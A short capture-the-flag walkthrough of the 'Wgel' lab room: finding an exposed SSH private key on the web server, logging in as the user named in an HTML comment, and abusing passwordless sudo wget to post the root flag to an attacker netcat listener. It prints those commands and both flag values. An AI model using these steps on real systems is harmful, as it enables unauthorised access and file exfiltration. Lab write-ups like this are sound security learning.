# Wgel CTF

A easy, three step-ish room

1. Recon showed ssh and a website on 80
2. The website hosted the default apache page, and a website under /sitemap called 'unapp'.
3. Dirb also discovered /sitemap/.ssh/id_rsa, containing some user's private key. I downloaded this and set its permissions with `chmod 600 wgel.key`

    > A private key allows me to connect over ssh with `ssh -i key user@ip`, no password required. However I needed to find the username.

4. Checking the page sources of the sitemap unapp site, I couldn't spot anything. Eventually I checked the source of the default apache site, and found ` <!-- Jessie don't forget to udate the webiste -->`
5. `ssh -i wgel.key jessie@10.10.162.237` got me in. There was nothing in the base of the user's directory, but `ls **` revealed the `user_flag.txt` under `./Documents`: `057c67131c3d5e42dd5cd3075b198ff6`
6. `sudo -l` revealed the user could execute `wget` as root with no passwd. Wget is interesting - there is no clear way to use it to get a shell, or anything. However, as root, I could post any local file to a remote url if I wished.
7. Guessing the filename, and setting up `nc -nvlp 4444 > out` on my attacker machine, I used `sudo wget --post-file=/root/root_flag.txt 10.10.84.108:4444/` to get the root flag exfiltrated: `b1b968b37519ad1daa6408188649263d`.